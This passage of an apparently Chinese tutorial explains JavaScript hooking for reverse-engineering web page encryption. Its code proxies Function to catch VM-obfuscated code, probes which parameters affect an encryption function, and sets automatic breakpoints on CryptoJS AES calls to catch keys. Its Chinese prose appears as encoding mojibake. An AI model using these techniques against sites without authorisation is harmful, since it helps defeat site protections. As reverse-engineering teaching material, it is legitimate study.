<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Proxy</span><span class="p">(</span><span class="nx">OriginalFunction</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">construct</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">];</span>

<span class="w">            </span><span class="c1">// æ£€æŸ¥æ˜¯å¦æ˜¯ VM ä»£ç </span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">isVM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vmPatterns</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="nx">pattern</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">pattern</span><span class="p">));</span>

<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">isVM</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸš¨ æ£€æµ‹åˆ° VM ä»£ç æ‰§è¡Œ&#39;</span><span class="p">);</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ä»£ç ç‰‡æ®µ:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">200</span><span class="p">));</span>
<span class="w">                </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// æ–­ç‚¹</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">Reflect</span><span class="p">.</span><span class="nx">construct</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âœ… VM æ£€æµ‹ Hook å·²å®‰è£…&#39;</span><span class="p">);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="æ¡ˆä¾‹3-å‚æ•°æ±¡æŸ“æ£€æµ‹">æ¡ˆä¾‹3: å‚æ•°æ±¡æŸ“æ£€æµ‹</h3>

      <p>è‡ªåŠ¨æ£€æµ‹å“ªäº›å‚æ•°å¯¹åŠ å¯†ç»“æœæœ‰å½±å“ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">class</span><span class="w"> </span><span class="nx">ParameterAnalyzer</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">targetFunction</span><span class="p">,</span><span class="w"> </span><span class="nx">referenceOutput</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">targetFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">targetFunction</span><span class="p">;</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">referenceOutput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">referenceOutput</span><span class="p">;</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// æµ‹è¯•å•ä¸ªå‚æ•°çš„å½±å“</span>
<span class="w">    </span><span class="nx">testParameter</span><span class="p">(</span><span class="nx">baseParams</span><span class="p">,</span><span class="w"> </span><span class="nx">paramIndex</span><span class="p">,</span><span class="w"> </span><span class="nx">testValue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">testParams</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[...</span><span class="nx">baseParams</span><span class="p">];</span>
<span class="w">        </span><span class="nx">testParams</span><span class="p">[</span><span class="nx">paramIndex</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">testValue</span><span class="p">;</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">targetFunction</span><span class="p">(...</span><span class="nx">testParams</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">changed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">referenceOutput</span><span class="p">;</span>

<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
<span class="w">            </span><span class="nx">paramIndex</span><span class="p">,</span>
<span class="w">            </span><span class="nx">testValue</span><span class="p">,</span>
<span class="w">            </span><span class="nx">output</span><span class="p">,</span>
<span class="w">            </span><span class="nx">changed</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">changed</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// è‡ªåŠ¨åŒ–æµ‹è¯•</span>
<span class="w">    </span><span class="nx">analyze</span><span class="p">(</span><span class="nx">baseParams</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ”¬ å¼€å§‹å‚æ•°åˆ†æ&#39;</span><span class="p">);</span>

<span class="w">        </span><span class="nx">baseParams</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">param</span><span class="p">,</span><span class="w"> </span><span class="nx">index</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`\næµ‹è¯•å‚æ•° </span><span class="si">${</span><span class="nx">index</span><span class="si">}</span><span class="sb">:`</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// æµ‹è¯•ä¸åŒçš„å€¼</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">testValues</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">                </span><span class="kc">null</span><span class="p">,</span>
<span class="w">                </span><span class="kc">undefined</span><span class="p">,</span>
<span class="w">                </span><span class="s1">&#39;&#39;</span><span class="p">,</span>
<span class="w">                </span><span class="mf">0</span><span class="p">,</span>
<span class="w">                </span><span class="nx">param</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;_modified&#39;</span><span class="p">,</span>
<span class="w">                </span><span class="nx">param</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="o">?</span><span class="p">.()</span>
<span class="w">            </span><span class="p">].</span><span class="nx">filter</span><span class="p">(</span><span class="nx">v</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">v</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="kc">undefined</span><span class="p">);</span>

<span class="w">            </span><span class="nx">testValues</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">testValue</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">changed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">testParameter</span><span class="p">(</span><span class="nx">baseParams</span><span class="p">,</span><span class="w"> </span><span class="nx">index</span><span class="p">,</span><span class="w"> </span><span class="nx">testValue</span><span class="p">);</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`  </span><span class="si">${</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">testValue</span><span class="p">)</span><span class="si">}</span><span class="sb"> =&gt; </span><span class="si">${</span><span class="nx">changed</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s1">&#39;âœ… å½±å“è¾“å‡º&#39;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;âŒ æ— å½±å“&#39;</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">report</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">report</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;\n=== åˆ†ææŠ¥å‘Š ===&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">criticalParams</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">results</span>
<span class="w">            </span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">changed</span><span class="p">)</span>
<span class="w">            </span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">paramIndex</span><span class="p">);</span>

<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;å…³é”®å‚æ•°ç´¢å¼•:&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[...</span><span class="ow">new</span><span class="w"> </span><span class="nb">Set</span><span class="p">(</span><span class="nx">criticalParams</span><span class="p">)]);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="c1">// å‡è®¾å‘ç°äº†åŠ å¯†å‡½æ•° encryptData(timestamp, userId, data)</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">analyzer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ParameterAnalyzer</span><span class="p">(</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">encryptData</span><span class="p">,</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">encryptData</span><span class="p">(</span><span class="mf">1638360000</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;123&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="p">)</span>
<span class="p">);</span>

<span class="nx">analyzer</span><span class="p">.</span><span class="nx">analyze</span><span class="p">([</span><span class="mf">1638360000</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;123&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="p">]);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è°ƒè¯•é›†æˆæŠ€å·§">è°ƒè¯•é›†æˆæŠ€å·§</h2>

      <h3 id="æ¡ä»¶æ—¥å¿—">æ¡ä»¶æ—¥å¿—</h3>

      <p>åªåœ¨æ»¡è¶³æ¡ä»¶æ—¶è¾“å‡ºæ—¥å¿—ï¼Œå‡å°‘å™ªéŸ³ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">class</span><span class="w"> </span><span class="nx">ConditionalLogger</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">condition</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">condition</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">condition</span><span class="p">;</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">log</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">condition</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(...</span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="nx">buffer</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">flush</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;=== ç¼“å†²æ—¥å¿— ===&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">buffer</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">args</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(...</span><span class="nx">args</span><span class="p">));</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// åªåœ¨ç‰¹å®šURLæ—¶è®°å½•</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ConditionalLogger</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">logger</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;è¿™æ¡æ—¥å¿—åªåœ¨ /login é¡µé¢æ˜¾ç¤º&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="è‡ªåŠ¨åŒ–æ–­ç‚¹æ³¨å…¥">è‡ªåŠ¨åŒ–æ–­ç‚¹æ³¨å…¥</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨åŠ å¯†å‡½æ•°çš„å…³é”®å‚æ•°å¤„è‡ªåŠ¨æ–­ç‚¹</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">autoBreakpoint</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">paramChecker</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj</span><span class="p">[</span><span class="nx">method</span><span class="p">];</span>

<span class="w">    </span><span class="nx">obj</span><span class="p">[</span><span class="nx">method</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">paramChecker</span><span class="p">(</span><span class="nx">args</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ¯ è§¦å‘è‡ªåŠ¨æ–­ç‚¹&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;å‚æ•°:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">            </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// è‡ªåŠ¨æ–­ç‚¹</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">}</span>

<span class="c1">// ç¤ºä¾‹ï¼šå½“å¯†é’¥åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²æ—¶æ–­ç‚¹</span>
<span class="nx">autoBreakpoint</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;encrypt&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="o">?</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;secret&#39;</span><span class="p">);</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µæ€»ç»“">æœ€ä½³å®è·µæ€»ç»“</h2>

      <h3 id="1-hook-æ—¶æœº">1. Hook æ—¶æœº</h3>

      <ul>
        <li><strong>å°½æ—©æ³¨å…¥</strong>: åœ¨é¡µé¢è„šæœ¬æ‰§è¡Œå‰æ³¨å…¥ Hookï¼ˆä½¿ç”¨æµè§ˆå™¨æ‰©å±•æˆ–ä»£ç†ï¼‰</li>
        <li><strong>å¼‚æ­¥ Hook</strong>: å¯¹äºåŠ¨æ€åŠ è½½çš„åº“ï¼Œä½¿ç”¨ MutationObserver ç›‘å¬</li>
      </ul>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç›‘å¬åŠ¨æ€åŠ è½½çš„ CryptoJS</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">observer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">MutationObserver</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">CryptoJS</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">_cryptoHooked</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nb">window</span><span class="p">.</span><span class="nx">_cryptoHooked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">        </span><span class="c1">// å®‰è£… Hook</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âœ… CryptoJS å·²åŠ è½½ï¼Œå®‰è£… Hook&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="nx">observer</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">childList</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="nx">subtree</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">});</span>
</code></pre>
      </div>

      <h3 id="2-æ€§èƒ½è€ƒè™‘">2. æ€§èƒ½è€ƒè™‘</h3>

      <ul>
        <li>é¿å…åœ¨ Hook ä¸­æ‰§è¡Œè€—æ—¶æ“ä½œ</li>
        <li>ä½¿ç”¨æ¡ä»¶åˆ¤æ–­å‡å°‘ä¸å¿…è¦çš„æ—¥å¿—</li>
        <li>è€ƒè™‘ä½¿ç”¨ <code>requestIdleCallback</code> å»¶è¿Ÿéå…³é”®æ—¥å¿—</li>
      </ul>

      <h3 id="3-é”™è¯¯å¤„ç†">3. é”™è¯¯å¤„ç†</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">safeHook</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">callback</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj</span><span class="p">[</span><span class="nx">method</span><span class="p">];</span>

<span class="w">    </span><span class="nx">obj</span><span class="p">[</span><span class="nx">method</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">callback</span><span class="p">(</span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Hook é”™è¯¯:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">error</span><span class="p">);</span>
<span class="w">            </span><span class="c1">// ç»§ç»­æ‰§è¡ŒåŸå‡½æ•°</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="4-æ¸…ç†å’Œæ¢å¤">4. æ¸…ç†å’Œæ¢å¤</h3>

      <p>å§‹ç»ˆä¿å­˜åŸå‡½æ•°å¼•ç”¨ï¼Œä¾¿äºæ¢å¤ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">_originalFunctions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">_originalFunctions</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">{};</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">installHook</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">hook</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">obj</span><span class="p">.</span><span class="kr">constructor</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nx">method</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">_originalFunctions</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj</span><span class="p">[</span><span class="nx">method</span><span class="p">];</span>
<span class="w">    </span><span class="nx">obj</span><span class="p">[</span><span class="nx">method</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">hook</span><span class="p">(</span><span class="nx">obj</span><span class="p">[</span><span class="nx">method</span><span class="p">]);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">uninstallAllHooks</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="p">[</span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">original</span><span class="p">]</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">_originalFunctions</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="p">[</span><span class="nx">objName</span><span class="p">,</span><span class="w"> </span><span class="nx">method</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nb">window</span><span class="p">[</span><span class="nx">objName</span><span class="p">][</span><span class="nx">method</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">original</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âœ… æ‰€æœ‰ Hook å·²ç§»é™¤&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å·¥å…·æ¨è">å·¥å…·æ¨è</h2>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>ç”¨é€”</th>
            <th>é“¾æ¥</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Tampermonkey</strong></td>
            <td>ç”¨æˆ·è„šæœ¬ç®¡ç†ï¼Œè‡ªåŠ¨æ³¨å…¥ Hook</td>
            <td>https://www.tampermonkey.net/</td>
          </tr>
          <tr>
            <td><strong>Proxy SwitchyOmega</strong></td>
            <td>ä»£ç†åˆ‡æ¢ï¼Œé…åˆ mitmproxy æ³¨å…¥</td>
            <td>https://github.com/FelisCatus/SwitchyOmega</td>
          </tr>
          <tr>
            <td><strong>Chrome DevTools</strong></td>
            <td>åŸç”Ÿæ–­ç‚¹å’Œç›‘æ§</td>
            <td>å†…ç½®</td>
          </tr>
          <tr>
            <td><strong>Frida</strong></td>
            <td>åŠ¨æ€æ’æ¡©æ¡†æ¶ï¼ˆé€‚ç”¨äº Appï¼‰</td>
            <td>https://frida.re/</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å•†ä¸šåŒ–åŠ¨æ€åˆ†æå¹³å°å¯¹æ¯”">å•†ä¸šåŒ–åŠ¨æ€åˆ†æå¹³å°å¯¹æ¯”</h2>

      <p>å¯¹äºä¼ä¸šçº§é¡¹ç›®ï¼Œå•†ä¸šåŒ–çš„åŠ¨æ€åˆ†æå’ŒHookå¹³å°å¯ä»¥æ˜¾è‘—æå‡æ•ˆç‡å’Œå¯é æ€§ã€‚ä»¥ä¸‹æ˜¯å¸‚åœºä¸»æµæ–¹æ¡ˆå¯¹æ¯”ã€‚</p>

      <h3 id="1-ä¸“ä¸šåŠ¨æ€åˆ†æå·¥å…·">1. ä¸“ä¸šåŠ¨æ€åˆ†æå·¥å…·</h3>

      <h4 id="fridaå¼€æºä¼ä¸šçº§å¯ç”¨">Fridaï¼ˆå¼€æºï¼Œä¼ä¸šçº§å¯ç”¨ï¼‰</h4>

      <p><strong>å®šä½</strong>: æœ€æµè¡Œçš„åŠ¨æ€æ’æ¡©æ¡†æ¶</p>

      <p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>æ”¯æŒJavaScript/Python/Swiftç­‰å¤šè¯­è¨€</li>
        <li>è·¨å¹³å°ï¼ˆiOS/Android/Windows/macOS/Linuxï¼‰</li>
        <li>æ´»è·ƒçš„ç¤¾åŒºå’Œä¸°å¯Œçš„è„šæœ¬åº“</li>
        <li>ä¼ä¸šå¯å…è´¹ä½¿ç”¨</li>
      </ul>

      <p><strong>åº”ç”¨åœºæ™¯</strong>:</p>

      <ul>
